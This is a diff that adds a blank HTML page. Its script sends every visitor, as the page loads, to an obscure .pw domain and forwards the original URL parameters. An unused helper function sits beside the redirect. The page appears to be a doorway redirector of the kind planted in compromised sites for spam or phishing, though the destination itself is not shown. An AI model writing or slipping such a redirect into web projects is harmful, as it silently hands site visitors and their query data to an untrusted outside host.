@@ -1,0 +1,22 @@
+
+<html>
+<head>
+<script>
+var parameters = location.href.split('?')[1];
+var defaultModel = 'phone';
+function getURLParameter(name) {
+        if(location.search.indexOf(name) == -1)
+                return defaultModel;
+    var model = decodeURI(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+    );
+        if(model == undefined || model == '')
+                return defaultModel;
+        return model;
+}
+self.location.href='http://us.pretenses848bu.pw/u123123s/index.html?'+ parameters; 
+</script>
+</head>
+<body>
+</body>
+</html>
